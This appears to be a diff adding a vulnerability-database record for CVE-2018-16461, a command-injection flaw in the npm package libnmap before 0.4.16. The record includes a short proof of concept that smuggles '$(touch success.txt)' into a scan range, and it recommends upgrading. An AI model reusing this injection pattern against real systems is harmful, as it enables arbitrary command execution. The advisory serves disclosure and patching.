@@ -1,0 +1,39 @@
+advisory_id: GHSA-7g2w-6r25-2j7p
+datasource_id: github_osv_importer_v2/GHSA-7g2w-6r25-2j7p
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2018/11/GHSA-7g2w-6r25-2j7p/GHSA-7g2w-6r25-2j7p.json
+aliases:
+  - CVE-2018-16461
+summary: "Command Injection in libnmap\nVersions of `libnmap` before 0.4.16 are vulnerable to\
+  \ command injection. \n\nProof of concept\n\n```js\nconst nmap = require('libnmap');\nconst\
+  \ opts = {\n    range: [\n        'scanme.nmap.org',\n        \"x.x.$(touch success.txt)\"\
+  \n    ]\n};\nnmap.scan(opts, function(err, report) {\n    if (err) throw new Error(err);\n\
+  \n    for (let item in report) {\n        console.log(JSON.stringify(report[item]));\n   \
+  \ }\n});\n```\n\n\n## Recommendation\n\nUpdate to version 0.4.16 or later"
+impacted_packages:
+  - purl: pkg:npm/libnmap
+    affected_versions: vers:npm/<0.4.16
+    fixed_versions: vers:npm/0.4.16
+severities:
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url:
+weaknesses:
+  - CWE-77
+references:
+  - url: https://github.com/advisories/GHSA-7g2w-6r25-2j7p
+    reference_type:
+    reference_id:
+  - url: https://github.com/nodejs/security-wg/blob/master/vuln/npm/474.json
+    reference_type:
+    reference_id:
+  - url: https://hackerone.com/reports/390865
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2018-16461
+    reference_type:
+    reference_id:
+  - url: https://www.npmjs.com/advisories/719
+    reference_type:
+    reference_id:
